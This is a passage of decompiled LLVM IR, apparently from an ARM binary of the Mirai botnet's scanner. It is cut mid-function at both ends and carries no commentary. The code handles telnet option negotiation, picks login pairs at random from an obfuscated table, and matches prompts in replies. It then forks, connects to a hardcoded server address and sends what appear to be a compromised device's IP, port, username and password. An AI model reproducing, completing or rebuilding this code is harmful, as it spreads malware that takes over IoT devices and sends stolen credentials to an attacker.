  store i32 5, i32* %r0.global-to-local, align 4
  %v1_10f48 = call i32 @table_lock_val(i32 5)
  store i32 %v1_10f48, i32* %r0.global-to-local, align 4
  store i32 6, i32* @r3, align 4
  %v1_10f50 = load i32, i32* @r6, align 4
  %v2_10f50 = add i32 %v1_10f50, 12
  %v3_10f50 = inttoptr i32 %v2_10f50 to i32*
  store i32 6, i32* %v3_10f50, align 4
  br label %dec_label_pc_10828

dec_label_pc_10f58:                               ; preds = %dec_label_pc_10be4
  store i32 ptrtoint (i32* @global_var_1a8e0.227 to i32), i32* @r1, align 4
  store i32 3, i32* @r2, align 4
  store i32 %v2_10f64, i32* @r0, align 4
  %v0_10f68 = call i32 @memcpy()
  store i32 9, i32* @r2, align 4
  store i32 %v2_10f74, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1a8d7.229 to i32), i32* @r1, align 4
  %v0_10f7c = call i32 @memcpy()
  store i32 %v0_10f7c, i32* %r0.global-to-local, align 4
  %v0_10f80 = load i32, i32* @r6, align 4
  %v1_10f80 = add i32 %v0_10f80, 24
  %v2_10f80 = inttoptr i32 %v1_10f80 to i32*
  %v3_10f80 = load i32, i32* %v2_10f80, align 4
  %v0_10f84 = load i32, i32* @r4, align 4
  %v1_10f84 = add i32 %v0_10f84, 2
  store i32 %v1_10f84, i32* %r2.global-to-local, align 4
  %v0_10f88 = load i32, i32* @sl, align 4
  %v2_10f88 = add i32 %v0_10f88, %v3_10f80
  store i32 %v2_10f88, i32* @r3, align 4
  %v3_10f8c = icmp uge i32 %v2_10f88, %v1_10f84
  store i1 %v3_10f8c, i1* %cpsr_c.global-to-local, align 1
  %v9_10f8c = icmp eq i32 %v2_10f88, %v1_10f84
  store i1 %v9_10f8c, i1* %cpsr_z.global-to-local, align 1
  %v2_10f90 = xor i1 %v3_10f8c, true
  %v3_10f90 = or i1 %v9_10f8c, %v2_10f90
  br i1 %v3_10f90, label %dec_label_pc_10f58.dec_label_pc_10c60.loopexit_crit_edge, label %dec_label_pc_10f94

dec_label_pc_10f58.dec_label_pc_10c60.loopexit_crit_edge: ; preds = %dec_label_pc_10f58
  %v0_10c60.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_10c60

dec_label_pc_10f94:                               ; preds = %dec_label_pc_10f58
  %v2_10f94 = inttoptr i32 %v1_10f84 to i8*
  %v3_10f94 = load i8, i8* %v2_10f94, align 1
  %v4_10f94 = zext i8 %v3_10f94 to i32
  store i32 %v4_10f94, i32* %r3.global-to-local, align 4
  %v2_10f98 = icmp ugt i8 %v3_10f94, 30
  store i1 %v2_10f98, i1* %cpsr_c.global-to-local, align 1
  %v7_10f98 = icmp eq i8 %v3_10f94, 31
  store i1 %v7_10f98, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10f98, label %dec_label_pc_1102c, label %dec_label_pc_10fa0

dec_label_pc_10fa0:                               ; preds = %dec_label_pc_10f94
  %v1_10fa0 = inttoptr i32 %v0_10f84 to i8*
  %v2_10fa0 = load i8, i8* %v1_10fa0, align 1
  %v3_10fa0 = zext i8 %v2_10fa0 to i32
  store i32 %v3_10fa0, i32* %r3.global-to-local, align 4
  %v2_10fa4 = icmp ugt i8 %v2_10fa0, -4
  store i1 %v2_10fa4, i1* %cpsr_c.global-to-local, align 1
  %v7_10fa4 = icmp eq i8 %v2_10fa0, -3
  store i1 %v7_10fa4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10fa4, label %.thread745, label %dec_label_pc_10fb4

.thread745:                                       ; preds = %dec_label_pc_10fa0
  store i32 -4, i32* %r3.global-to-local, align 4
  store i8 -4, i8* %v1_10fa0, align 1
  %v0_10fb0.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_10fb0.pr.pr, label %dec_label_pc_10bf8, label %.thread745.dec_label_pc_10fb4thread-pre-split_crit_edge

.thread745.dec_label_pc_10fb4thread-pre-split_crit_edge: ; preds = %.thread745
  %v0_10fb4.pr.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10fb4

dec_label_pc_10fb4:                               ; preds = %dec_label_pc_10fa0, %.thread745.dec_label_pc_10fb4thread-pre-split_crit_edge
  %v0_10fb4.pr = phi i32 [ %v0_10fb4.pr.pre, %.thread745.dec_label_pc_10fb4thread-pre-split_crit_edge ], [ %v3_10fa0, %dec_label_pc_10fa0 ]
  %v2_10fb4 = icmp ugt i32 %v0_10fb4.pr, 250
  store i1 %v2_10fb4, i1* %cpsr_c.global-to-local, align 1
  %v7_10fb4 = icmp eq i32 %v0_10fb4.pr, 251
  store i1 %v7_10fb4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10fb4, label %bb1966, label %dec_label_pc_10bf8

bb1966:                                           ; preds = %dec_label_pc_10fb4
  store i32 -3, i32* %r3.global-to-local, align 4
  %v3_10fbc = load i32, i32* @r4, align 4
  %v4_10fbc = inttoptr i32 %v3_10fbc to i8*
  store i8 -3, i8* %v4_10fbc, align 1
  br label %dec_label_pc_10bf8

dec_label_pc_10fc4:                               ; preds = %dec_label_pc_10dd0, %dec_label_pc_10dc8, %dec_label_pc_10dc0, %bb1961, %dec_label_pc_10d98, %dec_label_pc_10d74, %.thread727, %dec_label_pc_10d90, %dec_label_pc_10d88, %bb1960
  %v0_10fc8 = phi i32 [ %v1_10d68, %dec_label_pc_10d98 ], [ %v1_10d68, %dec_label_pc_10d74 ], [ %v1_10dd8, %.thread727 ], [ %v1_10d68, %dec_label_pc_10d90 ], [ %v1_10d68, %dec_label_pc_10d88 ], [ %v1_10d68, %bb1960 ], [ %v1_10dd8, %bb1961 ], [ %v1_10dd8, %dec_label_pc_10dc0 ], [ %v1_10dd8, %dec_label_pc_10dc8 ], [ %v1_10dd8, %dec_label_pc_10dd0 ]
  store i32 26, i32* %r0.global-to-local, align 4
  %v1_10fc8 = add i32 %v0_10fc8, 1
  store i32 %v1_10fc8, i32* @r7, align 4
  %v1_10fcc = call i32 @table_lock_val(i32 26)
  store i32 27, i32* %r0.global-to-local, align 4
  %v1_10fd4 = call i32 @table_lock_val(i32 27)
  store i32 %v1_10fd4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10fd8

dec_label_pc_10fd8:                               ; preds = %dec_label_pc_10e68, %dec_label_pc_10fc4
  %v0_10fd8 = load i32, i32* @r6, align 4
  %v1_10fd8 = inttoptr i32 %v0_10fd8 to i32*
  %v2_10fd8 = load i32, i32* %v1_10fd8, align 4
  store i32 %v2_10fd8, i32* %r3.global-to-local, align 4
  %v1_10fdc = add i32 %v0_10fd8, 4
  %v2_10fdc = inttoptr i32 %v1_10fdc to i32*
  %v3_10fdc = load i32, i32* %v2_10fdc, align 4
  store i32 %v3_10fdc, i32* %r0.global-to-local, align 4
  %v1_10fe0 = add i32 %v2_10fd8, 12
  %v2_10fe0 = inttoptr i32 %v1_10fe0 to i8*
  %v3_10fe0 = load i8, i8* %v2_10fe0, align 1
  %v4_10fe0 = zext i8 %v3_10fe0 to i32
  store i32 %v4_10fe0, i32* %r2.global-to-local, align 4
  %v1_10fe4 = inttoptr i32 %v2_10fd8 to i32*
  %v2_10fe4 = load i32, i32* %v1_10fe4, align 4
  store i32 %v2_10fe4, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_10fec = call i32 @__libc_send(i32 %v3_10fdc, i32 %v2_10fe4, i32 %v4_10fe0, i32 16384)
  store i32 %v4_10fec, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_10ff4 = load i32, i32* @r6, align 4
  %v1_10ff4 = add i32 %v0_10ff4, 4
  %v2_10ff4 = inttoptr i32 %v1_10ff4 to i32*
  %v3_10ff4 = load i32, i32* %v2_10ff4, align 4
  store i32 %v3_10ff4, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1a8d4.225 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v4_11000 = call i32 @__libc_send(i32 %v3_10ff4, i32 ptrtoint ([3 x i8]* @global_var_1a8d4.225 to i32), i32 2, i32 16384)
  store i32 %v4_11000, i32* %r0.global-to-local, align 4
  store i32 4, i32* @r3, align 4
  %v1_11008 = load i32, i32* @r6, align 4
  %v2_11008 = add i32 %v1_11008, 12
  %v3_11008 = inttoptr i32 %v2_11008 to i32*
  store i32 4, i32* %v3_11008, align 4
  br label %.thread1199

dec_label_pc_11010:                               ; preds = %dec_label_pc_10cd4, %dec_label_pc_10ccc, %bb1957, %dec_label_pc_10ca4, %dec_label_pc_10c88, %.thread719, %dec_label_pc_10c9c, %bb1956
  %v0_11014 = phi i32 [ %v1_10c7c, %dec_label_pc_10ca4 ], [ %v1_10c7c, %dec_label_pc_10c88 ], [ %v1_10cdc, %.thread719 ], [ %v1_10c7c, %dec_label_pc_10c9c ], [ %v1_10c7c, %bb1956 ], [ %v1_10cdc, %bb1957 ], [ %v1_10cdc, %dec_label_pc_10ccc ], [ %v1_10cdc, %dec_label_pc_10cd4 ]
  store i32 25, i32* %r0.global-to-local, align 4
  %v1_11014 = add i32 %v0_11014, 1
  store i32 %v1_11014, i32* @r7, align 4
  %v1_11018 = call i32 @table_lock_val(i32 25)
  br label %dec_label_pc_10d2c

dec_label_pc_11020:                               ; preds = %dec_label_pc_107e8
  %v0_11020 = load i32, i32* @r6, align 4
  store i32 %v0_11020, i32* @r0, align 4
  %v0_11024 = call i32 @setup_connection()
  store i32 %v0_11024, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10824

dec_label_pc_1102c:                               ; preds = %dec_label_pc_10f94
  store i32 %v2_10f64, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v1_1103c = add i32 %v0_10f80, 4
  %v2_1103c = inttoptr i32 %v1_1103c to i32*
  %v3_1103c = load i32, i32* %v2_1103c, align 4
  store i32 %v3_1103c, i32* %r0.global-to-local, align 4
  %v4_11040 = call i32 @__libc_send(i32 %v3_1103c, i32 %v2_10f64, i32 3, i32 16384)
  store i32 %v4_11040, i32* %r0.global-to-local, align 4
  store i32 %v2_10f6c, i32* %r1.global-to-local, align 4
  %v0_11048 = load i32, i32* @r6, align 4
  %v1_11048 = add i32 %v0_11048, 4
  %v2_11048 = inttoptr i32 %v1_11048 to i32*
  %v3_11048 = load i32, i32* %v2_11048, align 4
  store i32 %v3_11048, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10c44

dec_label_pc_11058:                               ; preds = %dec_label_pc_1069c
  store i32 %.pre, i32* @r0, align 4
  %v1_11060 = add i32 %v0_11058, 92
  store i32 %v1_11060, i32* @r1, align 4
  store i32 192, i32* @r2, align 4
  %v3_11068 = call i32 @memmove(i32 %.pre, i32 %v1_11060, i32 192)
  store i32 %v3_11068, i32* %r0.global-to-local, align 4
  %v0_1106c = load i32, i32* @r6, align 4
  %v1_1106c = add i32 %v0_1106c, 24
  %v2_1106c = inttoptr i32 %v1_1106c to i32*
  %v3_1106c = load i32, i32* %v2_1106c, align 4
  %v1_11070 = add i32 %v3_1106c, -64
  store i32 %v1_11070, i32* %r3.global-to-local, align 4
  store i32 %v1_11070, i32* %v2_1106c, align 4
  br label %dec_label_pc_106ac

dec_label_pc_1107c:                               ; preds = %dec_label_pc_10654
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 4, i32* %stack_var_-60, align 4
  store i32 %v2_e600, i32* %r3.global-to-local, align 4
  store i32 %v2_10df4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  store i32 1, i32* @r1, align 4
  store i8 0, i8* %stack_var_-56, align 1
  %v5_110a4 = call i32 @getsockopt(i32 %v3_10648, i32 1, i32 4, i32 %v2_e600, i32 %v2_10df4)
  %v3_110a8 = load i8, i8* %stack_var_-56, align 1
  %v4_110a8 = sext i8 %v3_110a8 to i32
  store i32 %v4_110a8, i32* %r3.global-to-local, align 4
  %v2_110ac = or i32 %v4_110a8, %v5_110a4
  store i32 %v2_110ac, i32* %r0.global-to-local, align 4
  %v4_110ac = icmp eq i32 %v2_110ac, 0
  store i1 %v4_110ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_110ac, label %dec_label_pc_110b4, label %dec_label_pc_11220

dec_label_pc_110b4:                               ; preds = %dec_label_pc_1107c
  store i32 2, i32* %r3.global-to-local, align 4
  %v1_110b8 = load i32, i32* @r6, align 4
  %v2_110b8 = add i32 %v1_110b8, 12
  %v3_110b8 = inttoptr i32 %v2_110b8 to i32*
  store i32 2, i32* %v3_110b8, align 4
  %v0_110bc = call i32 @rand_next()
  %v2_110c4 = load i16, i16* bitcast (i16** @global_var_2327c.142 to i16*), align 4
  %v3_110c4 = zext i16 %v2_110c4 to i32
  %v3_110c8 = urem i32 %v0_110bc, %v3_110c4
  store i32 ptrtoint (i32* @global_var_2324c.138 to i32), i32* %r0.global-to-local, align 4
  %v2_110d0 = load i32, i32* @global_var_2324c.138, align 4
  store i32 %v2_110d0, i32* @lr, align 4
  %v1_110d8 = load i32, i32* @r4, align 4
  %v9_110d8 = icmp eq i32 %v2_110d0, %v1_110d8
  store i1 %v9_110d8, i1* %cpsr_z.global-to-local, align 1
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i32 %v3_110c8, i32* %r1.global-to-local, align 4
  %v7_110e0 = icmp sgt i32 %v2_110d0, %v1_110d8
  br i1 %v7_110e0, label %dec_label_pc_110e4, label %dec_label_pc_11354

dec_label_pc_110e4:                               ; preds = %dec_label_pc_110b4
  %v2_110e8 = load i32, i32* @global_var_23278.140, align 4
  store i32 %v2_110e8, i32* %ip.global-to-local, align 4
  store i32 %v1_110d8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_110fc

dec_label_pc_110f4:                               ; preds = %dec_label_pc_11114, %dec_label_pc_110fc
  %v9_110f4 = icmp eq i32 %v1_11108, %v2_110d0
  br i1 %v9_110f4, label %dec_label_pc_11354.loopexit, label %dec_label_pc_110fc

dec_label_pc_110fc:                               ; preds = %dec_label_pc_110f4, %dec_label_pc_110e4
  %v0_11108 = phi i32 [ %v1_11108, %dec_label_pc_110f4 ], [ %v1_110d8, %dec_label_pc_110e4 ]
  %v0_11114 = phi i32 [ %v1_1110c, %dec_label_pc_110f4 ], [ %v2_110e8, %dec_label_pc_110e4 ]
  store i32 %v0_11114, i32* %r0.global-to-local, align 4
  %v1_11100 = add i32 %v0_11114, 8
  %v2_11100 = inttoptr i32 %v1_11100 to i16*
  %v3_11100 = load i16, i16* %v2_11100, align 2
  %v4_11100 = zext i16 %v3_11100 to i32
  store i32 %v4_11100, i32* %r3.global-to-local, align 4
  %v1_11108 = add i32 %v0_11108, 1
  store i32 %v1_11108, i32* %r2.global-to-local, align 4
  %v1_1110c = add i32 %v0_11114, 16
  store i32 %v1_1110c, i32* %ip.global-to-local, align 4
  %tmp1967 = icmp ugt i32 %v4_11100, %v3_110c8
  br i1 %tmp1967, label %dec_label_pc_110f4, label %dec_label_pc_11114

dec_label_pc_11114:                               ; preds = %dec_label_pc_110fc
  %v1_11114 = add i32 %v0_11114, 10
  %v2_11114 = inttoptr i32 %v1_11114 to i16*
  %v3_11114 = load i16, i16* %v2_11114, align 2
  %v4_11114 = zext i16 %v3_11114 to i32
  store i32 %v4_11114, i32* %r3.global-to-local, align 4
  %v3_11118 = icmp uge i32 %v4_11114, %v3_110c8
  %v9_11118 = icmp eq i32 %v4_11114, %v3_110c8
  %v2_1111c = xor i1 %v3_11118, true
  %v3_1111c = or i1 %v9_11118, %v2_1111c
  br i1 %v3_1111c, label %dec_label_pc_110f4, label %dec_label_pc_11120.loopexit

dec_label_pc_11120.loopexit:                      ; preds = %dec_label_pc_11114
  store i1 %v3_11118, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_11120

dec_label_pc_11120:                               ; preds = %dec_label_pc_11120.loopexit, %dec_label_pc_11354
  %v0_11134 = phi i32 [ %v0_11114, %dec_label_pc_11120.loopexit ], [ 0, %dec_label_pc_11354 ]
  %v0_11120 = load i32, i32* @r6, align 4
  %v1_11120 = add i32 %v0_11120, 4
  %v2_11120 = inttoptr i32 %v1_11120 to i32*
  %v3_11120 = load i32, i32* %v2_11120, align 4
  %v3_11124 = udiv i32 %v3_11120, 32
  store i32 %v3_11124, i32* %r2.global-to-local, align 4
  %v1_11128 = urem i32 %v3_11120, 32
  store i32 %v1_11128, i32* %r1.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_1112c = mul nuw nsw i32 %v3_11124, 4
  store i32 %v3_1112c, i32* @ip, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_11134 = inttoptr i32 %v0_11120 to i32*
  store i32 %v0_11134, i32* %v2_11134, align 4
  %v0_11138 = load i32, i32* %r3.global-to-local, align 4
  %v1_11138 = load i32, i32* @r6, align 4
  %v2_11138 = add i32 %v1_11138, 24
  %v3_11138 = inttoptr i32 %v2_11138 to i32*
  store i32 %v0_11138, i32* %v3_11138, align 4
  %v0_1067c.pre = load i32, i32* @ip, align 4
  %v1_10684.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_10678

dec_label_pc_11174:                               ; preds = %dec_label_pc_107b0
  store i32 9, i32* %r0.global-to-local, align 4
  %v1_11180 = call i32 @table_unlock_val(i32 9)
  store i32 %v2_10df4, i32* %r1.global-to-local, align 4
  store i32 9, i32* %r0.global-to-local, align 4
  %v3_11190 = call i32 @table_retrieve_val(i32 9, i32* nonnull %stack_var_-60)
  store i32 %v3_11190, i32* %r0.global-to-local, align 4
  %v3_11194 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_11190, i32* %r2.global-to-local, align 4
  %v1_1119c = add i32 %v3_11194, -1
  store i32 %v1_1119c, i32* %r3.global-to-local, align 4
  %v0_111a0 = load i32, i32* @r6, align 4
  %v1_111a0 = add i32 %v0_111a0, 24
  %v2_111a0 = inttoptr i32 %v1_111a0 to i32*
  %v3_111a0 = load i32, i32* %v2_111a0, align 4
  store i32 %v3_111a0, i32* %r1.global-to-local, align 4
  %v0_111a4 = load i32, i32* @sl, align 4
  store i32 %v0_111a4, i32* %r0.global-to-local, align 4
  %v4_111a8 = call i32 @util_memsearch(i32 %v0_111a4, i32 %v3_111a0, i32 %v3_11190, i32 %v1_1119c)
  store i32 %v4_111a8, i32* @r7, align 4
  store i32 9, i32* %r0.global-to-local, align 4
  %v1_111b4 = call i32 @table_lock_val(i32 9)
  store i32 %v1_111b4, i32* %r0.global-to-local, align 4
  %v0_111b8 = load i32, i32* @r7, align 4
  %v2_111b8 = icmp eq i32 %v0_111b8, -1
  store i1 %v2_111b8, i1* %cpsr_c.global-to-local, align 1
  %v7_111b8 = icmp eq i32 %v0_111b8, -1
  store i1 %v7_111b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_111b8, label %dec_label_pc_10690.loopexit, label %dec_label_pc_111c0

dec_label_pc_111c0:                               ; preds = %dec_label_pc_11174
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_111c0 = icmp eq i32 %v0_111b8, 0
  store i1 %v2_111c0, i1* %cpsr_z.global-to-local, align 1
  %tmp1968 = icmp slt i32 %v0_111b8, 1
  br i1 %tmp1968, label %.thread1199, label %dec_label_pc_111c8

dec_label_pc_111c8:                               ; preds = %dec_label_pc_111c0
  %v0_111c8 = load i32, i32* @r6, align 4
  %v1_111c8 = add i32 %v0_111c8, 20
  %v2_111c8 = inttoptr i32 %v1_111c8 to i16*
  %v3_111c8 = load i16, i16* %v2_111c8, align 2
  %v4_111c8 = zext i16 %v3_111c8 to i32
  store i32 %v4_111c8, i32* %r3.global-to-local, align 4
  %v1_111cc = add i32 %v0_111c8, 16
  %v2_111cc = inttoptr i32 %v1_111cc to i32*
  %v3_111cc = load i32, i32* %v2_111cc, align 4
  store i32 %v3_111cc, i32* %r2.global-to-local, align 4
  store i32 %v2_111d0, i32* %ip.global-to-local, align 4
  store i32 %v4_111c8, i32* %stack_var_-42, align 4
  store i32 %v3_111cc, i32* %stack_var_-60, align 4
  %v1_111dc = inttoptr i32 %v0_111c8 to i32*
  %v2_111dc = load i32, i32* %v1_111dc, align 4
  store i32 %v2_111dc, i32* @r8, align 4
  %v0_111e0 = call i32 @__libc_fork()
  store i32 %v0_111e0, i32* %r0.global-to-local, align 4
  %v7_111e4 = icmp eq i32 %v0_111e0, -1
  %.2044 = zext i1 %v7_111e4 to i32
  store i32 %.2044, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_111f0 = icmp eq i32 %v0_111e0, 0
  store i1 %v2_111f0, i1* %cpsr_z.global-to-local, align 1
  %tmp1971 = icmp slt i32 %v0_111e0, 1
  br i1 %tmp1971, label %bb1972, label %.thread751

.thread751:                                       ; preds = %dec_label_pc_111c8
  store i32 1, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_11204

bb1972:                                           ; preds = %dec_label_pc_111c8
  store i32 %.2044, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_111fc = icmp eq i1 %v7_111e4, false
  store i1 %v2_111fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_111fc, label %dec_label_pc_1123c, label %dec_label_pc_11204

dec_label_pc_11204:                               ; preds = %.thread751, %bb1972, %bb1974
  %v0_11204 = load i32, i32* @r6, align 4
  %v1_11204 = add i32 %v0_11204, 4
  %v2_11204 = inttoptr i32 %v1_11204 to i32*
  %v3_11204 = load i32, i32* %v2_11204, align 4
  store i32 %v3_11204, i32* %r0.global-to-local, align 4
  %v1_11208 = call i32 @__GI___libc_close(i32 %v3_11204)
  store i32 %v1_11208, i32* %r0.global-to-local, align 4
  store i32 -1, i32* @r3, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_11214 = load i32, i32* @r6, align 4
  %v2_11214 = add i32 %v1_11214, 4
  %v3_11214 = inttoptr i32 %v2_11214 to i32*
  store i32 -1, i32* %v3_11214, align 4
  %v0_11218 = load i32, i32* %r2.global-to-local, align 4
  %v1_11218 = load i32, i32* @r6, align 4
  %v2_11218 = add i32 %v1_11218, 12
  %v3_11218 = inttoptr i32 %v2_11218 to i32*
  store i32 %v0_11218, i32* %v3_11218, align 4
  br label %.thread1199

dec_label_pc_11220:                               ; preds = %dec_label_pc_1107c
  %v0_11220 = load i32, i32* @r6, align 4
  %v1_11220 = add i32 %v0_11220, 4
  %v2_11220 = inttoptr i32 %v1_11220 to i32*
  %v3_11220 = load i32, i32* %v2_11220, align 4
  store i32 %v3_11220, i32* %r0.global-to-local, align 4
  %v1_11224 = call i32 @__GI___libc_close(i32 %v3_11220)
  store i32 %v1_11224, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_1122c = load i32, i32* @r4, align 4
  %v1_1122c = load i32, i32* @r6, align 4
  %v2_1122c = add i32 %v1_1122c, 12
  %v3_1122c = inttoptr i32 %v2_1122c to i32*
  store i32 %v0_1122c, i32* %v3_1122c, align 4
  %v0_11230 = load i32, i32* %r3.global-to-local, align 4
  %v1_11230 = load i32, i32* @r6, align 4
  %v2_11230 = add i32 %v1_11230, 4
  %v3_11230 = inttoptr i32 %v2_11230 to i32*
  store i32 %v0_11230, i32* %v3_11230, align 4
  %v0_11234 = load i32, i32* @r4, align 4
  %v1_11234 = trunc i32 %v0_11234 to i8
  %v2_11234 = load i32, i32* @r6, align 4
  %v3_11234 = add i32 %v2_11234, 284
  %v4_11234 = inttoptr i32 %v3_11234 to i8*
  store i8 %v1_11234, i8* %v4_11234, align 1
  br label %dec_label_pc_10798

dec_label_pc_1123c:                               ; preds = %bb1972
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_11248 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_11248, i32* @r4, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v1_11254 = call i32 @table_unlock_val(i32 2)
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 2, i32* %stack_var_-96, align 4
  store i32 ptrtoint ([15 x i8]* @global_var_1a7fc.88 to i32), i32* @r0, align 4
  %v2_11268 = call i32 @inet_addr(i32 ptrtoint ([15 x i8]* @global_var_1a7fc.88 to i32))
  %v0_1126c = load i32, i32* @r5, align 4
  store i32 %v0_1126c, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_11278 = inttoptr i32 %v0_1126c to i32*
  %v3_11278 = call i32 @table_retrieve_val(i32 2, i32* %v2_11278)
  store i32 %v2_111d0, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v1_1128c = call i32 @table_lock_val(i32 2)
  %v0_11294 = load i32, i32* @r4, align 4
  store i32 %v0_11294, i32* %r0.global-to-local, align 4
  store i32 %v2_11298, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_112a0 = call i32 @__libc_connect(i32 %v0_11294, i32 %v2_11298, i32 16)
  store i32 %v3_112a0, i32* %r0.global-to-local, align 4
  %v2_112a4 = icmp eq i32 %v3_112a0, -1
  store i1 %v2_112a4, i1* %cpsr_c.global-to-local, align 1
  %v7_112a4 = icmp eq i32 %v3_112a0, -1
  store i1 %v7_112a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_112a4, label %bb1973, label %bb1974

bb1973:                                           ; preds = %dec_label_pc_1123c
  %v1_112a8 = load i32, i32* @r4, align 4
  store i32 %v1_112a8, i32* %r0.global-to-local, align 4
  br label %bb1974

bb1974:                                           ; preds = %dec_label_pc_1123c, %bb1973
  store i32 70320, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v7_112a4, i32 ptrtoint (i32* @global_var_157e0.110 to i32))
  store i32 %v2_e600, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_112bc = load i32, i32* @r4, align 4
  store i32 %v0_112bc, i32* %r0.global-to-local, align 4
  %v0_112c0 = load i32, i32* @r5, align 4
  %v6_112c0 = trunc i32 %v0_112c0 to i8
  store i8 %v6_112c0, i8* %stack_var_-56, align 1
  %v6_112c4 = call i32 @__libc_send(i32 %v0_112bc, i32 %v2_e600, i32 1, i32 16384)
  %v0_112cc = load i32, i32* @r4, align 4
  store i32 %v0_112cc, i32* %r0.global-to-local, align 4
  store i32 %v2_10df4, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_112dc = call i32 @__libc_send(i32 %v0_112cc, i32 %v2_10df4, i32 4, i32 16384)
  %v0_112e4 = load i32, i32* @r4, align 4
  store i32 %v0_112e4, i32* %r0.global-to-local, align 4
  store i32 %v2_112e8, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_112f4 = call i32 @__libc_send(i32 %v0_112e4, i32 %v2_112e8, i32 2, i32 16384)
  %v0_112f8 = load i32, i32* @r8, align 4
  %v1_112f8 = add i32 %v0_112f8, 12
  store i32 %v1_112f8, i32* %r1.global-to-local, align 4
  %v0_112fc = load i32, i32* @r4, align 4
  store i32 %v0_112fc, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_11308 = call i32 @__libc_send(i32 %v0_112fc, i32 %v1_112f8, i32 1, i32 16384)
  store i32 %v4_11308, i32* %r0.global-to-local, align 4
  %v0_1130c = load i32, i32* @r8, align 4
  %v1_1130c = inttoptr i32 %v0_1130c to i32*
  %v2_1130c = load i32, i32* %v1_1130c, align 4
  store i32 %v2_1130c, i32* %r1.global-to-local, align 4
  %v1_11310 = add i32 %v0_1130c, 12
  %v2_11310 = inttoptr i32 %v1_11310 to i8*
  %v3_11310 = load i8, i8* %v2_11310, align 1
  %v4_11310 = zext i8 %v3_11310 to i32
  store i32 %v4_11310, i32* %r2.global-to-local, align 4
  %v0_11314 = load i32, i32* @r4, align 4
  store i32 %v0_11314, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_1131c = call i32 @__libc_send(i32 %v0_11314, i32 %v2_1130c, i32 %v4_11310, i32 16384)
  %v0_11320 = load i32, i32* @r8, align 4
  %v1_11320 = add i32 %v0_11320, 13
  store i32 %v1_11320, i32* %r1.global-to-local, align 4
  %v0_11324 = load i32, i32* @r4, align 4
  store i32 %v0_11324, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_11330 = call i32 @__libc_send(i32 %v0_11324, i32 %v1_11320, i32 1, i32 16384)
  %v0_11334 = load i32, i32* @r4, align 4
  store i32 %v0_11334, i32* %r0.global-to-local, align 4
  %v0_11338 = load i32, i32* @r8, align 4
  %v1_11338 = add i32 %v0_11338, 13
  %v2_11338 = inttoptr i32 %v1_11338 to i8*
  %v3_11338 = load i8, i8* %v2_11338, align 1
  %v4_11338 = zext i8 %v3_11338 to i32
  store i32 %v4_11338, i32* %r2.global-to-local, align 4
  %v1_1133c = add i32 %v0_11338, 4
  %v2_1133c = inttoptr i32 %v1_1133c to i32*
  %v3_1133c = load i32, i32* %v2_1133c, align 4
  store i32 %v3_1133c, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
